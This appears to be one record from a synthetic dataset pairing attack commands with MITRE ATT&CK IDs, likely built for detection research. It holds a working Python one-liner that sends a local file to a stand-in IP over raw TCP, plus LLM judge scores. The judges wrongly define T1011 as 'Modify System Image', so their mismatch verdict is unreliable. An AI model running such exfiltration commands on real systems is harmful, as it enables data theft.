@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Python",
+  "command": "python3 -c 'import socket,struct; s=socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\"203.0.113.88\", 52689)); d=open(\"/Users/Shared/.rpt\",\"rb\").read(); s.sendall(struct.pack(\"!I\",len(d))+d); s.close()'",
+  "explanation": "Uses a custom length-prefixed payload over a high, uncommon TCP port to simulate an alternate application-layer medium rather than a standard C2 channel, consistent with T1011.",
+  "rationale_steps": [
+    "Open a TCP socket to a documentation IP on a non-standard port (52689).",
+    "Prefix data with a 4-byte big-endian length for simple reassembly.",
+    "Transmit over a custom TCP stream to represent an alternate medium.",
+    "No obfuscation; user privileges only."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-e8d4b4c2-3e5696a3",
+  "source_prompt_hash": "e8d4b4c2",
+  "timestamp_utc": "2025-09-30T08:45:56.629990Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced quotes, parentheses, and proper syntax for imports, socket creation, connection, file reading, and data transmission.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically valid for exfiltrating data, it doesn't align with T1011 (Modify System Image) as it's not modifying firmware/OS images but rather reading and transmitting an existing file over a socket connection.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T17:43:20.926309Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with balanced quotes and parentheses, and uses valid Python syntax for single-line execution via `python3 -c`.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration of a regular file, which is fundamentally misaligned with T1011 'Modify System Image', a technique focused on altering firmware or OS images.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T17:43:31.088586Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Python one-liner with balanced quoting/parentheses and valid socket/file operations.",
+        "semantic_score": 1,
+        "semantic_justification": "It exfiltrates a file over a custom TCP socket and does not alter any system/firmware image, so it is not aligned with the described technique.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T17:43:47.202633Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
